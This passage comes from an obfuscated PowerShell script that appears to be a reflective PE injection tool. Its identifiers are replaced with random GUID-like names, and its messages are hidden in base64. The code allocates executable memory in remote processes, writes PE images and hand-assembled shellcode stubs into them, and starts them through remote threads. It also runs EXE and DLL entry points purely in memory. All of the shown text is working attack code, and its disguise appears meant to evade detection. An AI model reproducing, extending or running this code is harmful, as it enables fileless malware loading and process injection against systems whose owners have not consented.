            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIAB1AHMAZQAgAEYAbwByAGMAZQBBAFMATABSACAAdwBoAGUAbgAgAGwAbwBhAGQAaQBuAGcAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4A'))) -ErrorAction Stop
        }
        if (${3df75c88c87d449581d2b42e447373e5} -and (-not ${00a74bd019ae4a419665129fb47a4135}))
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSAC4AIABDAGEAbgBuAG8AdAAgAGwAbwBhAGQAIABhACAAbgBvAG4ALQBBAFMATABSACAAUABFACAAaQBuACAAdABvACAAYQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwA='))) -ErrorAction Stop
        }
		${d9510966a3a443f1926a3ce72ac5937f} = [IntPtr]::Zero				
		${d9c93b756b664621a6be2f9b2debb1bf} = [IntPtr]::Zero		
		if (${3df75c88c87d449581d2b42e447373e5} -eq $true)
		{
			${d9510966a3a443f1926a3ce72ac5937f} = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${b5905e299da14ea186abe1140fee1a54}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			${d9c93b756b664621a6be2f9b2debb1bf} = $Win32Functions.VirtualAllocEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${e3f8667d5e364efd96c0bb33c49e6df9}, [UIntPtr]${b5905e299da14ea186abe1140fee1a54}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${d9c93b756b664621a6be2f9b2debb1bf} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIABJAGYAIAB0AGgAZQAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSACwAIABpAHQAIABjAG8AdQBsAGQAIABiAGUAIAB0AGgAYQB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGIAYQBzAGUAIABhAGQAZAByAGUAcwBzACAAbwBmACAAdABoAGUAIABQAEUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUA')))
			}
		}
		else
		{
			if (${67971bbd18cc497f9e99c62a0974e4ce} -eq $true)
			{
				${d9510966a3a443f1926a3ce72ac5937f} = $Win32Functions.VirtualAlloc.Invoke(${e3f8667d5e364efd96c0bb33c49e6df9}, [UIntPtr]${b5905e299da14ea186abe1140fee1a54}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				${d9510966a3a443f1926a3ce72ac5937f} = $Win32Functions.VirtualAlloc.Invoke(${e3f8667d5e364efd96c0bb33c49e6df9}, [UIntPtr]${b5905e299da14ea186abe1140fee1a54}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			${d9c93b756b664621a6be2f9b2debb1bf} = ${d9510966a3a443f1926a3ce72ac5937f}
		}
		[IntPtr]${fcc60f06214f44efaf6bdbadcb602a00} = c36a6fff11ae41aab0147e8eb916744d (${d9510966a3a443f1926a3ce72ac5937f}) ([Int64]${b5905e299da14ea186abe1140fee1a54}.SizeOfImage)
		if (${d9510966a3a443f1926a3ce72ac5937f} -eq [IntPtr]::Zero)
		{ 
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGwAbABvAGMAIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIABQAEUALgAgAEkAZgAgAFAARQAgAGkAcwAgAG4AbwB0ACAAQQBTAEwAUgAgAGMAbwBtAHAAYQB0AGkAYgBsAGUALAAgAHQAcgB5ACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABpAG4AIABhACAAbgBlAHcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAgACgAdABoAGUAIABuAGUAdwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABwAHIAbwBjAGUAcwBzACAAdwBpAGwAbAAgAGgAYQB2AGUAIABhACAAZABpAGYAZgBlAHIAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGwAYQB5AG8AdQB0ACwAIABzAG8AIAB0AGgAZQAgAGEAZABkAHIAZQBzAHMAIAB0AGgAZQAgAFAARQAgAHcAYQBuAHQAcwAgAG0AaQBnAGgAdAAgAGIAZQAgAGYAcgBlAGUAKQAuAA==')))
		}		
		[System.Runtime.InteropServices.Marshal]::Copy(${c8e0d86ea0e74817acb552fc5014588b}, 0, ${d9510966a3a443f1926a3ce72ac5937f}, ${b5905e299da14ea186abe1140fee1a54}.SizeOfHeaders) | Out-Null
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAZQB0AGEAaQBsAGUAZAAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGgAZQBhAGQAZQByAHMAIABsAG8AYQBkAGUAZAAgAGkAbgAgAG0AZQBtAG8AcgB5AA==')))
		${b5905e299da14ea186abe1140fee1a54} = a4058eb6b7e24f7f8d162c0ac15a5e95 -d9510966a3a443f1926a3ce72ac5937f ${d9510966a3a443f1926a3ce72ac5937f} -Win32Types $Win32Types -Win32Constants $Win32Constants
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${fcc60f06214f44efaf6bdbadcb602a00}
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${d9c93b756b664621a6be2f9b2debb1bf}
		Write-Verbose "StartAddress: $(b2b513762da64d59b95fcbd6d9534bf7 ${d9510966a3a443f1926a3ce72ac5937f})    EndAddress: $(b2b513762da64d59b95fcbd6d9534bf7 ${fcc60f06214f44efaf6bdbadcb602a00})"
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAgAFAARQAgAHMAZQBjAHQAaQBvAG4AcwAgAGkAbgAgAHQAbwAgAG0AZQBtAG8AcgB5AA==')))
		d7bc93360cf646c6a5a5d709f2ea3884 -c8e0d86ea0e74817acb552fc5014588b ${c8e0d86ea0e74817acb552fc5014588b} -b5905e299da14ea186abe1140fee1a54 ${b5905e299da14ea186abe1140fee1a54} -Win32Functions $Win32Functions -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGEAZABkAHIAZQBzAHMAZQBzACAAYgBhAHMAZQBkACAAbwBuACAAdwBoAGUAcgBlACAAdABoAGUAIABQAEUAIAB3AGEAcwAgAGEAYwB0AHUAYQBsAGwAeQAgAGwAbwBhAGQAZQBkACAAaQBuACAAbQBlAG0AbwByAHkA')))
		d85b0f374a6643b8be26a0c88e868708 -b5905e299da14ea186abe1140fee1a54 ${b5905e299da14ea186abe1140fee1a54} -bbdf587793764367b319a04d6eb00abe ${bbdf587793764367b319a04d6eb00abe} -Win32Constants $Win32Constants -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAIABEAEwATAAnAHMAIABuAGUAZQBkAGUAZAAgAGIAeQAgAHQAaABlACAAUABFACAAdwBlACAAYQByAGUAIABsAG8AYQBkAGkAbgBnAA==')))
		if (${3df75c88c87d449581d2b42e447373e5} -eq $true)
		{
			bb9212d45c4b468f830c0dd3e0e21de4 -b5905e299da14ea186abe1140fee1a54 ${b5905e299da14ea186abe1140fee1a54} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -b8098c5a8297473498a6b72001bbfcf1 ${b8098c5a8297473498a6b72001bbfcf1}
		}
		else
		{
			bb9212d45c4b468f830c0dd3e0e21de4 -b5905e299da14ea186abe1140fee1a54 ${b5905e299da14ea186abe1140fee1a54} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		if (${3df75c88c87d449581d2b42e447373e5} -eq $false)
		{
			if (${67971bbd18cc497f9e99c62a0974e4ce} -eq $true)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAHAAcgBvAHQAZQBjAHQAaQBvAG4AIABmAGwAYQBnAHMA')))
				c5eaa1052d3d43308384637719b46c09 -b5905e299da14ea186abe1140fee1a54 ${b5905e299da14ea186abe1140fee1a54} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAcgBlAGYAbABlAGMAdABpAHYAZQBsAHkAIABsAG8AYQBkAGUAZAAgAGkAcwAgAG4AbwB0ACAAYwBvAG0AcABhAHQAaQBiAGwAZQAgAHcAaQB0AGgAIABOAFgAIABtAGUAbQBvAHIAeQAsACAAawBlAGUAcABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAYQBzACAAcgBlAGEAZAAgAHcAcgBpAHQAZQAgAGUAeABlAGMAdQB0AGUA')))
			}
		}
		else
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAbABvAGEAZABlAGQAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACwAIABuAG8AdAAgAGEAZABqAHUAcwB0AGkAbgBnACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMA')))
		}
		if (${3df75c88c87d449581d2b42e447373e5} -eq $true)
		{
			[UInt32]${ebaa2d792332466cb1cf1a277e96e1b3} = 0
			${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.WriteProcessMemory.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${d9c93b756b664621a6be2f9b2debb1bf}, ${d9510966a3a443f1926a3ce72ac5937f}, [UIntPtr](${b5905e299da14ea186abe1140fee1a54}.SizeOfImage), [Ref]${ebaa2d792332466cb1cf1a277e96e1b3})
			if (${b252c80d481e4d599d8c2226f6c56423} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
		}
		if (${b5905e299da14ea186abe1140fee1a54}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			if (${3df75c88c87d449581d2b42e447373e5} -eq $false)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaABhAHMAIABiAGUAZQBuACAAbABvAGEAZABlAGQA')))
				${d622ad7cc34147aa867723fa7fb221d2} = c36a6fff11ae41aab0147e8eb916744d (${b5905e299da14ea186abe1140fee1a54}.PEHandle) (${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				${0214fa5f52fe492a986cb17f6b62a0f6} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${c22b1b87799340f8b549804ea33ae913} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${d622ad7cc34147aa867723fa7fb221d2}, ${0214fa5f52fe492a986cb17f6b62a0f6})
				${c22b1b87799340f8b549804ea33ae913}.Invoke(${b5905e299da14ea186abe1140fee1a54}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				${d622ad7cc34147aa867723fa7fb221d2} = c36a6fff11ae41aab0147e8eb916744d (${d9c93b756b664621a6be2f9b2debb1bf}) (${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if (${b5905e299da14ea186abe1140fee1a54}.PE64Bit -eq $true)
				{
					${c56830ceeab0458d95ec8d8688548b9b} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${707e44bfa4ea45c6ac53014cdbf89039} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${81c136a987fa40f994c3443928b3f10f} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${c56830ceeab0458d95ec8d8688548b9b} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${707e44bfa4ea45c6ac53014cdbf89039} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${81c136a987fa40f994c3443928b3f10f} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${8910ffb6f9af4222aaa37c26fd3c4509} = ${c56830ceeab0458d95ec8d8688548b9b}.Length + ${707e44bfa4ea45c6ac53014cdbf89039}.Length + ${81c136a987fa40f994c3443928b3f10f}.Length + (${3ff8b22ecd6e4e91a20a6c4bd8305519} * 2)
				${3b1ba4c013b1469784f85eaa004a0cb7} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${8910ffb6f9af4222aaa37c26fd3c4509})
				${07df5eb296244663a059021557847f1e} = ${3b1ba4c013b1469784f85eaa004a0cb7}
				d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${c56830ceeab0458d95ec8d8688548b9b} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
				${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${c56830ceeab0458d95ec8d8688548b9b}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${d9c93b756b664621a6be2f9b2debb1bf}, ${3b1ba4c013b1469784f85eaa004a0cb7}, $false)
				${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${3ff8b22ecd6e4e91a20a6c4bd8305519})
				d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${707e44bfa4ea45c6ac53014cdbf89039} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
				${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${707e44bfa4ea45c6ac53014cdbf89039}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${d622ad7cc34147aa867723fa7fb221d2}, ${3b1ba4c013b1469784f85eaa004a0cb7}, $false)
				${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${3ff8b22ecd6e4e91a20a6c4bd8305519})
				d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${81c136a987fa40f994c3443928b3f10f} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
				${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${81c136a987fa40f994c3443928b3f10f}.Length)
				${17c67be0ad4a44d5afa1f03d7e7a2c48} = $Win32Functions.VirtualAllocEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, [IntPtr]::Zero, [UIntPtr][UInt64]${8910ffb6f9af4222aaa37c26fd3c4509}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if (${17c67be0ad4a44d5afa1f03d7e7a2c48} -eq [IntPtr]::Zero)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
				}
				${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.WriteProcessMemory.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${17c67be0ad4a44d5afa1f03d7e7a2c48}, ${07df5eb296244663a059021557847f1e}, [UIntPtr][UInt64]${8910ffb6f9af4222aaa37c26fd3c4509}, [Ref]${ebaa2d792332466cb1cf1a277e96e1b3})
				if ((${b252c80d481e4d599d8c2226f6c56423} -eq $false) -or ([UInt64]${ebaa2d792332466cb1cf1a277e96e1b3} -ne [UInt64]${8910ffb6f9af4222aaa37c26fd3c4509}))
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
				}
				${e177cfe1613b4b2488837e5483433c99} = ef987d4149fa413e954cb531fe969a83 -de6617bbc6024f2b859287e674e79d55 ${b8098c5a8297473498a6b72001bbfcf1} -e8467a7c0eca496ebed04014d585d83a ${17c67be0ad4a44d5afa1f03d7e7a2c48} -Win32Functions $Win32Functions
				${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.WaitForSingleObject.Invoke(${e177cfe1613b4b2488837e5483433c99}, 20000)
				if (${8e08ff89ff934c1fbfa999be923764fb} -ne 0)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
				}
				$Win32Functions.VirtualFreeEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${17c67be0ad4a44d5afa1f03d7e7a2c48}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif (${b5905e299da14ea186abe1140fee1a54}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA'))))
		{
			[IntPtr]${cf87c75665104b0d9bce1914a6e20ded} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte(${cf87c75665104b0d9bce1914a6e20ded}, 0, 0x00)
			${5212ad2924b0404eb49234a2913b3d27} = b6fcf6b0d493431890cd4ea16d58c8fc -b5905e299da14ea186abe1140fee1a54 ${b5905e299da14ea186abe1140fee1a54} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -dc4dd6aa6e944b868aa4edbd1d8c272a ${e6db2bb213e84f06b160fdf34abced4c} -cf87c75665104b0d9bce1914a6e20ded ${cf87c75665104b0d9bce1914a6e20ded}
			[IntPtr]${b48349dfab104584a72578dafc603d35} = c36a6fff11ae41aab0147e8eb916744d (${b5905e299da14ea186abe1140fee1a54}.PEHandle) (${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(b2b513762da64d59b95fcbd6d9534bf7 ${b48349dfab104584a72578dafc603d35}). Creating thread for the EXE to run in."
			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, ${b48349dfab104584a72578dafc603d35}, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]${790d3047e0944b49a2b3b76ff979573b} = [System.Runtime.InteropServices.Marshal]::ReadByte(${cf87c75665104b0d9bce1914a6e20ded}, 0)
				if (${790d3047e0944b49a2b3b76ff979573b} -eq 1)
				{
					d9840a9ff0174cfb95902793f665a5ff -bb61f798428f4a9e9b420dbf53df5840 ${5212ad2924b0404eb49234a2913b3d27} -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAIAB0AGgAcgBlAGEAZAAgAGgAYQBzACAAYwBvAG0AcABsAGUAdABlAGQALgA=')))
					break
				}
				else
				{
					sleep -Seconds 1
				}
			}
		}
		return @(${b5905e299da14ea186abe1140fee1a54}.PEHandle, ${d9c93b756b664621a6be2f9b2debb1bf})
	}
	Function e14aaa59745542a2a0e56de24b269161
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${d9510966a3a443f1926a3ce72ac5937f}
		)
		$Win32Constants = b3df47e05c264da9935d94ccf1848c18
		$Win32Functions = e17a4d1d978844eb8928769c36ef96fa
		$Win32Types = c1f42a3f37b440c28548cfb7f311709b
		${b5905e299da14ea186abe1140fee1a54} = a4058eb6b7e24f7f8d162c0ac15a5e95 -d9510966a3a443f1926a3ce72ac5937f ${d9510966a3a443f1926a3ce72ac5937f} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${7a0a6210726b4ffbaef8596efca04a5c} = c36a6fff11ae41aab0147e8eb916744d ([Int64]${b5905e299da14ea186abe1140fee1a54}.PEHandle) ([Int64]${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${a5b884a44e8c42c3b6549db81bb49aa5} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${7a0a6210726b4ffbaef8596efca04a5c}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${a5b884a44e8c42c3b6549db81bb49aa5}.Characteristics -eq 0 `
						-and ${a5b884a44e8c42c3b6549db81bb49aa5}.FirstThunk -eq 0 `
						-and ${a5b884a44e8c42c3b6549db81bb49aa5}.ForwarderChain -eq 0 `
						-and ${a5b884a44e8c42c3b6549db81bb49aa5}.Name -eq 0 `
						-and ${a5b884a44e8c42c3b6549db81bb49aa5}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAHUAbgBsAG8AYQBkAGkAbgBnACAAdABoAGUAIABsAGkAYgByAGEAcgBpAGUAcwAgAG4AZQBlAGQAZQBkACAAYgB5ACAAdABoAGUAIABQAEUA')))
					break
				}
				${b4c857b2e0d54ecf927e9431bcc43457} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((c36a6fff11ae41aab0147e8eb916744d ([Int64]${b5905e299da14ea186abe1140fee1a54}.PEHandle) ([Int64]${a5b884a44e8c42c3b6549db81bb49aa5}.Name)))
				${9633455150f947168fc5b7a9e462058e} = $Win32Functions.GetModuleHandle.Invoke(${b4c857b2e0d54ecf927e9431bcc43457})
				if (${9633455150f947168fc5b7a9e462058e} -eq $null)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZwBlAHQAdABpAG4AZwAgAEQATABMACAAaABhAG4AZABsAGUAIABpAG4AIABNAGUAbQBvAHIAeQBGAHIAZQBlAEwAaQBiAHIAYQByAHkALAAgAEQATABMAE4AYQBtAGUAOgAgACQAewBiADQAYwA4ADUANwBiADIAZQAwAGQANQA0AGUAYwBmADkAMgA3AGUAOQA0ADMAMQBiAGMAYwA0ADMANAA1ADcAfQAuACAAQwBvAG4AdABpAG4AdQBpAG4AZwAgAGEAbgB5AHcAYQB5AHMA'))) -WarningAction Continue
				}
				${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.FreeLibrary.Invoke(${9633455150f947168fc5b7a9e462058e})
				if (${b252c80d481e4d599d8c2226f6c56423} -eq $false)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAHIAZQBlACAAbABpAGIAcgBhAHIAeQA6ACAAJAB7AGIANABjADgANQA3AGIAMgBlADAAZAA1ADQAZQBjAGYAOQAyADcAZQA5ADQAMwAxAGIAYwBjADQAMwA0ADUANwB9AC4AIABDAG8AbgB0AGkAbgB1AGkAbgBnACAAYQBuAHkAdwBhAHkAcwAuAA=='))) -WarningAction Continue
				}
				${7a0a6210726b4ffbaef8596efca04a5c} = c36a6fff11ae41aab0147e8eb916744d (${7a0a6210726b4ffbaef8596efca04a5c}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaQBzACAAYgBlAGkAbgBnACAAdQBuAGwAbwBhAGQAZQBkAA==')))
		${d622ad7cc34147aa867723fa7fb221d2} = c36a6fff11ae41aab0147e8eb916744d (${b5905e299da14ea186abe1140fee1a54}.PEHandle) (${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		${0214fa5f52fe492a986cb17f6b62a0f6} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${c22b1b87799340f8b549804ea33ae913} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${d622ad7cc34147aa867723fa7fb221d2}, ${0214fa5f52fe492a986cb17f6b62a0f6})
		${c22b1b87799340f8b549804ea33ae913}.Invoke(${b5905e299da14ea186abe1140fee1a54}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.VirtualFree.Invoke(${d9510966a3a443f1926a3ce72ac5937f}, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if (${b252c80d481e4d599d8c2226f6c56423} -eq $false)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
		}
	}
	Function cb61d96575974b77be735598620e62fd
	{
		$Win32Functions = e17a4d1d978844eb8928769c36ef96fa
		$Win32Types = c1f42a3f37b440c28548cfb7f311709b
		$Win32Constants =  b3df47e05c264da9935d94ccf1848c18
		${b8098c5a8297473498a6b72001bbfcf1} = [IntPtr]::Zero
		if ((${d7dce71817674a8cb3038e161abf3313} -ne $null) -and (${d7dce71817674a8cb3038e161abf3313} -ne 0) -and (${c9c96b577e0a468286181674ff067853} -ne $null) -and (${c9c96b577e0a468286181674ff067853} -ne ""))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAcwB1AHAAcABsAHkAIABhACAAUAByAG8AYwBJAGQAIABhAG4AZAAgAFAAcgBvAGMATgBhAG0AZQAsACAAYwBoAG8AbwBzAGUAIABvAG4AZQAgAG8AcgAgAHQAaABlACAAbwB0AGgAZQByAA==')))
		}
		elseif (${c9c96b577e0a468286181674ff067853} -ne $null -and ${c9c96b577e0a468286181674ff067853} -ne "")
		{
			${dd4b0e12901b4b1f91cdf002aa0a1c6e} = @(ps -Name ${c9c96b577e0a468286181674ff067853} -ErrorAction SilentlyContinue)
			if (${dd4b0e12901b4b1f91cdf002aa0a1c6e}.Count -eq 0)
			{
